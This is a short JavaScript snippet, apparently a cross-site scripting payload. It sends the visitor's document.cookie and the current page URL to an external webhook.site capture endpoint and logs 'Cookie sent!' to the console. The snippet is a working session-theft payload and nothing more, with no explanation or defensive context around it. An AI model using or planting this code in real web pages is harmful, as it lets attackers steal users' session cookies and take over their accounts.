fetch('https://webhook.site/cbaeca30-f5c4-4055-90ad-06a4f9eba402?c' + document.cookie + '&url=' + location.href)
  .then(() => console.log('Cookie sent!'));
